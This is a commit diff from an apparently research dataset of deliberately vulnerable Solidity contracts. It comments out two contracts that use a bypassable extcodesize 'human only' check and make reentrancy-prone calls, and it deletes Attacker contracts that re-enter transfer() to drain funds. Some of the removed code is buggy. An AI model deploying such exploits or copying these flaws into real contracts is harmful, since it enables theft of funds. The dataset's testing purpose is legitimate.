7ebc604a955482258ab40e729f9f5679eb92b760
Lorenzo Benetollo <lorenzo.benetollo@gmail.com>
2025-10-31 17:48:23 +0100

    Human Ree contract disabled

--- dataset/handcrafted/0_8/cross-contract/access-control/human/Human_ree1.sol
+++ dataset/handcrafted/0_8/cross-contract/access-control/human/Human_ree1.sol
@@ -3,41 +3,41 @@ pragma solidity ^0.8.0;
 // SPDX-License-Identifier: GPL-3.0
 
 // TODO This contract must be fixed cause this is not vulnerabile as it is now
-contract C {
-    address[] private buyers;
+// contract C {
+//     address[] private buyers;
 
-    uint public currentKeyPrice = 1;
-    address private lastBuyer;
-    uint private lastBuyTimestamp;
+//     uint public currentKeyPrice = 1;
+//     address private lastBuyer;
+//     uint private lastBuyTimestamp;
 
-    // this modifier checks that caller is an EOA, though it can be bypassed by a contract constructor
-    modifier isHuman() {
-        address _addr = msg.sender;
-        uint256 _codeLength;
-        assembly {_codeLength := extcodesize(_addr)}
-        require(_codeLength == 0, "sorry humans only");
-        _;
-    }
+//     // this modifier checks that caller is an EOA, though it can be bypassed by a contract constructor
+//     modifier isHuman() {
+//         address _addr = msg.sender;
+//         uint256 _codeLength;
+//         assembly {_codeLength := extcodesize(_addr)}
+//         require(_codeLength == 0, "sorry humans only");
+//         _;
+//     }
 
-    function buyKey(address refund_address) isHuman() public payable {
-        require(msg.value > currentKeyPrice, "Not enough to buy a key");
-        lastBuyer = msg.sender;
-        lastBuyTimestamp = block.timestamp;
-        currentKeyPrice = buyers.length * 100;
+//     function buyKey(address refund_address) isHuman() public payable {
+//         require(msg.value > currentKeyPrice, "Not enough to buy a key");
+//         lastBuyer = msg.sender;
+//         lastBuyTimestamp = block.timestamp;
+//         currentKeyPrice = buyers.length * 100;
 
-        for (uint i = 0; i < buyers.length; i++) {
-            (bool success, ) = buyers[i].call{value:1}("");
-            require(success, "Refund failed");
-        }
-        buyers.push(refund_address);
-    }
+//         for (uint i = 0; i < buyers.length; i++) {
+//             (bool success, ) = buyers[i].call{value:1}("");
+//             require(success, "Refund failed");
+//         }
+//         buyers.push(refund_address);
+//     }
 
-    function close() isHuman public {
-        require(block.timestamp > lastBuyTimestamp + 1 hours);
-        (bool success, ) = lastBuyer.call{value: currentKeyPrice * 2}("");
-        require(success, "Call failed");
-    }
-}
+//     function close() isHuman public {
+//         require(block.timestamp > lastBuyTimestamp + 1 hours);
+//         (bool success, ) = lastBuyer.call{value: currentKeyPrice * 2}("");
+//         require(success, "Call failed");
+//     }
+// }
 
 // off chain
 // Attacker att = new Attacker();
--- dataset/handcrafted/0_8/cross-contract/access-control/human/Human_ree2.sol
+++ dataset/handcrafted/0_8/cross-contract/access-control/human/Human_ree2.sol
@@ -1,82 +1,35 @@
 pragma solidity ^0.8.0;
 
 // SPDX-License-Identifier: GPL-3.0
-contract C {
-    mapping (address => uint256) private bids;
-    uint highestBid;
-    address highestBidder;
+// TODO This contract must be fixed cause this is not vulnerabile as it is now
 
-    modifier isHuman() {
-        address _addr = msg.sender;
-        uint256 _codeLength;
-        assembly {_codeLength := extcodesize(_addr)}
-        require(_codeLength == 0, "sorry humans only");
-        _;
-    }
+// contract C {
+//     mapping (address => uint256) private bids;
+//     uint highestBid;
+//     address highestBidder;
 
-    function bid() public payable isHuman() {
-        require(msg.value > 0, "no zero value");
-        require(msg.value > highestBid, "no lowballing");
-        highestBid = msg.value;
-        highestBidder = msg.sender;
-        bids[msg.sender] += msg.value;       
-    }
+//     modifier isHuman() {
+//         address _addr = msg.sender;
+//         uint256 _codeLength;
+//         assembly {_codeLength := extcodesize(_addr)}
+//         require(_codeLength == 0, "sorry humans only");
+//         _;
+//     }
 
-    function transfer(address to) isHuman() public {
-        uint256 amt = bids[msg.sender];
-        require(amt > 0, "Insufficient funds");
-        (bool success, ) = to.call{value:amt}("");
-        require(success, "Call failed");
-        bids[msg.sender] = 0;    // side effect after call
-    }
+//     function bid() public payable isHuman() {
+//         require(msg.value > 0, "no zero value");
+//         require(msg.value > highestBid, "no lowballing");
+//         highestBid = msg.value;
+//         highestBidder = msg.sender;
+//         bids[msg.sender] += msg.value;       
+//     }
 
-}
+//     function transfer(address to) isHuman() public {
+//         uint256 amt = bids[msg.sender];
+//         require(amt > 0, "Insufficient funds");
+//         (bool success, ) = to.call{value:amt}("");
+//         require(success, "Call failed");
+//         bids[msg.sender] = 0;    // side effect after call
+//     }
 
-contract Attacker {
-    bool public deposited;
-    bytes initCode;
-    uint counter;
-
-    function attack() public {
-        // new Attacker2 with salt here
-        if (counter < 5) {
-            uint salt = 8746532;
-            counter++;
-            new Attacker2{salt: bytes32(salt), value: 1 ether}(deposited);
-        }
-    }
-
-    function setDeposited(bool _deposited) public {
-        deposited = _deposited;
-    }
-
-    function setCoounter(uint _counter) public {
-        counter = _counter;
-    }
-
-    receive() payable external {
-    }
-}
-
-contract Attacker2 {
-    address victim = 0xCAfEcAfeCAfECaFeCaFecaFecaFECafECafeCaFe;
-    address attacker; // = 0xbABEBABEBabeBAbEBaBeBabeBABEBabEBAbeBAbe;
-
-    constructor(address _attacker, bool deposited) payable {
-        attacker = _attacker;
-        if(deposited) {
-            C(victim).transfer(attacker);
-        } else {
-            C(victim).bid{value: msg.value}();
-            Attacker(payable(attacker)).setDeposited(true);
-            C(victim).transfer(attacker);
-        }
-
-    }
-
-    receive() payable external {
-        payable(attacker).transfer(msg.value);
-        Attacker(payable(attacker)).attack();
-        C(victim).transfer(attack);
-    }
-}
+// }
